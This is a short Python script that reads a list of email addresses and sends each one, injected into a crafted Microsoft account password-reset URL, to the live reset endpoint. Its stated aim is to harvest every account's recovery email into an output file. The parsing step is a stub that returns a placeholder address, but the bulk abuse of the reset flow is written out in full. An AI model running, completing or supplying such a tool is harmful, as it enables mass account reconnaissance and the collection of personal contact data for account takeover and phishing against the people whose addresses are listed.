import requests

# Function to process each email
def process_email(email):
    # Extract username and domain from the email
    username, domain = email.split('@')

    # URL template with placeholders for username and domain
    url_template = "https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf%3fusername%3d%22{username}%22%2540%22{domain}%22%26client_id%3d81feaced-5ddd-41e7-8bef-3e20a2689bb7%26username%3d%22{username}%22%2540%22{domain}%22%26client_id%3d81feaced-5ddd-41e7-8bef-3e20a2689bb7%26uaid%3de4169546dd814a67847a2a6bdf9236b5%26contextid%3dED3E5DFBB991A6A1%26opid%3dD7648D1025F690F2%26bk%3d1733156479%26login_hint%3d%22{username}%22%2540%22{domain}%22&id=292666&uiflavor=web&client_id=1E00004831683A&uaid=e4169546dd814a67847a2a6bdf9236b5&mkt=EN-GB&lc=2057&bk=1733156479&mn=%22email%22"

    # Replace placeholders with the actual username and domain
    url = url_template.format(username=username, domain=domain)

    # Send a GET request to the modified URL
    response = requests.get(url)

    # Check if the request was successful (status code 200)
    if response.status_code == 200:
        # Assuming the response contains the recovery email, extract it from the response content
        # You would need to modify this part based on the actual structure of the response
        recovery_email = extract_recovery_email(response.text)
        return recovery_email
    else:
        return None

# Dummy function to simulate extracting the recovery email (adjust based on actual HTML structure)
def extract_recovery_email(response_text):
    # In practice, you would need to parse the response and look for the email in the HTML
    # For simplicity, let's just return a placeholder string
    # In a real case, you might use BeautifulSoup or regex to find the email
    return "recovery_email@example.com"

# Main function to read emails from a file, process them, and save the result
def main():
    # Open the text file containing emails (each on a new line)
    with open('emails.txt', 'r') as file:
        emails = file.readlines()

    # Open a file to write the recovery emails
    with open('recovery_emails.txt', 'w') as output_file:
        for email in emails:
            email = email.strip()  # Remove any leading/trailing whitespace
            if email:
                recovery_email = process_email(email)
                if recovery_email:
                    output_file.write(f"{recovery_email}\n")

# Run the script
if __name__ == "__main__":
    main()
